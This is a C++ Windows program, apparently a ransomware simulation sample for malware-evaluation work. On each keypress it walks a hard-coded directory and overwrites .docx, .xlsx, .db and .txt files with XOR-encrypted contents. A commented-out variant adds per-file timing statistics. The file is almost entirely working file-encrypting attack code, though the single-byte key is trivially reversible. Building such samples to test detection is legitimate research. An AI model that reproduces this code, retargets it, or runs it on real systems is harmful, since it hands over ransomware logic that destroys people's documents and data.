#include <iostream>
#include <string>
#include <Windows.h>
#include <vector>
#include <fstream>
#include <sstream>

std::vector<std::string> allowedExtensions = { ".docx", ".xlsx", ".db", ".txt" };

// Simple XOR encryption with a key
void xorEncryptDecrypt(std::vector<char>& buffer, char key)
{
	for (auto& byte : buffer)
	{
		byte ^= key;
	}
}

// Check if a file has one of the allowed extensions
bool hasAllowedExtension(const std::string& filename)
{
	for (const auto& ext : allowedExtensions)
	{
		if (filename.size() >= ext.size() &&
			filename.compare(filename.size() - ext.size(), ext.size(), ext) == 0)
		{
			return true;
		}
	}
	return false;
}

// Encrypt files in a target directory
void encryptTargetFiles(const std::string& directory)
{
	std::string searchPath = directory + "\\*";
	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

	if (hFind == INVALID_HANDLE_VALUE)
	{
		std::cerr << "[!] Failed to open directory: " << directory << std::endl;
		return;
	}

	do
	{
		if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		{
			std::string filename = findData.cFileName;
			std::string fullPath = directory + "\\" + filename;

			if (hasAllowedExtension(filename))
			{
				std::ifstream inputFile(fullPath, std::ios::binary);
				if (!inputFile)
				{
					std::cerr << "[!] Failed to open: " << fullPath << std::endl;
					continue;
				}

				std::vector<char> buffer((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
				inputFile.close();

				xorEncryptDecrypt(buffer, 0xAB); // XOR with fixed key (0xAB)

				std::ofstream outputFile(fullPath, std::ios::binary | std::ios::trunc);
				if (!outputFile)
				{
					std::cerr << "[!] Failed to write to: " << fullPath << std::endl;
					continue;
				}

				outputFile.write(buffer.data(), buffer.size());
				outputFile.close();

				std::cout << "[+] Encrypted file: " << filename << std::endl;
			}
		}
	} while (FindNextFileA(hFind, &findData));

	FindClose(hFind);
}

int main()
{
	std::string value;
	const std::string targetDirectory = "C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files";

	while (true)
	{
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: " << GetProcessIdOfThread(currentThread) << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep and Encrypt Files (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);

		std::cout << "[*] Encrypting files in target directory..." << std::endl;
		encryptTargetFiles(targetDirectory);
	}

	return 0;
}


/*
#include <iostream>
#include <string>
#include <Windows.h>
#include <vector>
#include <fstream>
#include <sstream>
#include <chrono>

std::vector<std::string> allowedExtensions = { ".docx", ".xlsx", ".db", ".txt" };

// XOR encryption (used even if data is fake/failure)
void xorEncryptDecrypt(std::vector<char>& buffer, char key)
{
	for (auto& byte : buffer)
	{
		byte ^= key;
	}
}

bool hasAllowedExtension(const std::string& filename)
{
	for (const auto& ext : allowedExtensions)
	{
		if (filename.size() >= ext.size() &&
			filename.compare(filename.size() - ext.size(), ext.size(), ext) == 0)
		{
			return true;
		}
	}
	return false;
}

void encryptTargetFiles(const std::string& directory)
{
	std::string searchPath = directory + "\\*";
	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

	if (hFind == INVALID_HANDLE_VALUE)
	{
		std::cerr << "[!] Failed to open directory: " << directory << std::endl;
		return;
	}

	int attemptCount = 0;
	double totalMicroseconds = 0.0;

	do
	{
		if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		{
			std::string filename = findData.cFileName;
			std::string fullPath = directory + "\\" + filename;

			if (hasAllowedExtension(filename))
			{
				auto start = std::chrono::high_resolution_clock::now();

				bool success = false;

				std::ifstream inputFile(fullPath, std::ios::binary);
				if (inputFile)
				{
					std::vector<char> buffer((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
					inputFile.close();

					xorEncryptDecrypt(buffer, 0xAB);

					std::ofstream outputFile(fullPath, std::ios::binary | std::ios::trunc);
					if (outputFile)
					{
						outputFile.write(buffer.data(), buffer.size());
						outputFile.close();
						success = true;
					}
				}

				auto end = std::chrono::high_resolution_clock::now();
				std::chrono::duration<double, std::micro> duration = end - start;

				totalMicroseconds += duration.count();
				++attemptCount;

				if (success)
					std::cout << "[+] Encrypted file: " << filename << " (Time: " << duration.count() << " µs)\n";
				else
					std::cout << "[!] Failed to encrypt: " << filename << " (FakeFailure or real) - Time: " << duration.count() << " µs\n";
			}
		}
	} while (FindNextFileA(hFind, &findData));

	FindClose(hFind);

	if (attemptCount > 0)
	{
		double avgTime = totalMicroseconds / attemptCount;
		std::cout << "[*] Total files attempted: " << attemptCount << "\n";
		std::cout << "[*] Total time spent: " << totalMicroseconds << " µs\n";
		std::cout << "[*] Average time per attempt: " << avgTime << " µs\n";
	}
	else
	{
		std::cout << "[!] No matching files to process.\n";
	}
}

int main()
{
	std::string value;
	const std::string targetDirectory = "C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files";

	while (true)
	{
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: " << GetProcessIdOfThread(currentThread) << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep and Encrypt Files (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);

		std::cout << "[*] Attempting file encryption...\n";
		encryptTargetFiles(targetDirectory);
		std::cout << "\n";
	}

	return 0;
}
*/
